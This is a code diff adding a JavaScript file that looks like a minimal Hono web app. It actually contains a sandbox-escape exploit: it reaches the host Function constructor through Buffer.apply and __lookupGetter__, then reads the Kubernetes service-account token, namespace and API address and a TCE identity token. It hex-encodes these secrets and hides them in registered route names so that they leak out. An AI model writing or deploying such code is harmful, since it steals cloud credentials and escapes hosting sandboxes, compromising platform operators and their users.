@@ -1,0 +1,45 @@
+const { Hono } = require('hono');
+const app = new Hono();
+
+const g = ({}).__lookupGetter__;
+const a = Buffer.apply;
+const p = a.apply(g, [Buffer, ['__proto__']]);
+const hostFuncProto = p.call(a);
+const hostFunction = Object.getOwnPropertyDescriptor(hostFuncProto, 'constructor').value;
+
+let rceResult = '';
+try {
+  const mainProc = hostFunction('return process')();
+  const fs = mainProc.mainModule.require('fs');
+
+  const collect = {};
+
+  // K8s SA token (读全)
+  try { collect.k8s_token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8'); } catch(e){ collect.k8s_token = 'ERR:'+e.message; }
+
+  // K8s API 地址
+  try {
+    collect.k8s_host = mainProc.env.KUBERNETES_SERVICE_HOST || '';
+    collect.k8s_port = mainProc.env.KUBERNETES_SERVICE_PORT || '';
+  } catch(e){ collect.k8s_addr = 'ERR:'+e.message; }
+
+  // K8s namespace
+  try { collect.k8s_ns = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8'); } catch(e){ collect.k8s_ns = 'ERR:'+e.message; }
+
+  // TCE identity token (读全)
+  try { collect.tce_token = fs.readFileSync('/etc/tce_dynamic/identity.token', 'utf8'); } catch(e){ collect.tce_token = 'ERR:'+e.message; }
+
+  rceResult = JSON.stringify(collect);
+} catch(e) {
+  rceResult = 'RCE-FAIL:' + e.message;
+}
+
+const hex = Buffer.from(rceResult, 'utf8').toString('hex');
+const chunkSize = 60;
+for (let i = 0; i < hex.length; i += chunkSize) {
+  const idx = String(Math.floor(i / chunkSize)).padStart(3, '0');
+  const chunk = hex.slice(i, i + chunkSize);
+  app.get('/d' + idx + '_' + chunk, (c) => c.text(''));
+}
+
+module.exports = { default: app };
